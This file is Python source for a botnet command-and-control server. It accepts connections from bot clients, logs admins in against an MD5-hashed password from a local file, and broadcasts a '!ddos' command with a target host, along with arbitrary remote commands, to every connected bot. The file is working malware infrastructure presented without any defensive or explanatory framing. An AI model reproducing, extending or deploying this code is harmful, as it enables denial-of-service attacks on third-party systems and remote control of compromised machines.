import socket, threading, hashlib
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostbyname(socket.gethostname())
port = 1234
s.bind((host,port))
conn_list = []
admin_conn = []
def get_details():
    file = open('servadmin.txt','r')
    file_contents = file.read()
    file_contents = file_contents.split()
    ls = []
    user = file_contents[0]
    passw = file_contents[1]
    ls.append(user)
    ls.append(passw)
    return ls
def listen():
    print("[+] Server is listening for connections....")
    while True:
        s.listen(1)
        conn, ip = s.accept()
        msgtoadmin = f"{ip} Has Joined the server."
        print(f'[+] {msgtoadmin}')
        recieve = threading.Thread(target=reciever,args=(conn, ip))
        recieve.start()
        try:
            for admin in admin_conn:
                try:
                    admin.send(msgtoadmin.encode())
                except:
                    pass
        except:
            pass
def reciever(connection, ipaddr):
    try:
        botnet_client = False
        access = False
        while True:
            msg = connection.recv(1024)
            msg = msg.decode()
            if not botnet_client:
                if msg == "!clientlog":
                    botnet_client = True
                    conn_list.append(connection)
                else:
                    connection.send('You do not belong here.'.encode())
                    print(f"[+] {ipaddr} Is not a bot. Closing Connection.....")
                    connection.close()
            if botnet_client:
                if msg.startswith('!login'):
                    msg = msg.split()
                    details = get_details()
                    username = msg[1]
                    if username in details:
                        password = msg[2]
                        password = hashlib.md5(password.encode()).hexdigest()
                        if password == details[1]:
                            access = True
                            print(f"[+] {ipaddr} is an admin.")
                            admin_conn.append(connection)
                        else:
                            print(f"[+] {ipaddr} has Tried to gain access to the Control Center.")
                            print("[+] Closing the connection.........")
                            msgtoclient = "Access Denied."
                            connection.send(msgtoclient.encode())
                            connection.close()
                            pass
                    else:
                        print(f"[+] {ipaddr} has Tried to gain access to the Control Center.")
                        print("[+] Closing the Connection.........")
                        msgtoclient = 'Access Denied'.encode()
                        connection.send(msgtoclient)
                        connection.close()
                    msg = ""
                else:
                    pass
                if access:
                    if msg == "":
                        pass
                    else:
                        print(f"[(ADMIN)]: {msg}")
                    if msg.startswith("!ddos"):
                        flag = 0
                        try:
                            msgsplit = msg.split()
                            host = msgsplit[1]
                            host = socket.gethostbyname(host)
                            flag = 1
                        except:
                            flag = 0
                        if flag == 1:
                            for bot in conn_list:
                                try:
                                    if bot == connection:
                                        pass
                                    else:
                                        bot.send(msg.encode())
                                except:
                                    pass
                            connection.send('Starting DDoS Attack........'.encode())
                        else:
                            msgtoclient = "[+] Invalid IP Address Specified.".encode()
                            connection.send(msgtoclient)
                    else:
                        for bot in conn_list:
                            try:
                                if bot == connection or bot in admin_conn:
                                    pass
                                else:
                                    bot.send(msg.encode())
                            except:
                                pass
                        connection.send('Sent your Message as a CMD Command to the bots.'.encode())
    except ConnectionResetError:
        print(f"[+] {ipaddr} has gone offline.")
        connection.close()
    except ConnectionAbortedError:
        pass
    except OSError:
        pass
listen()
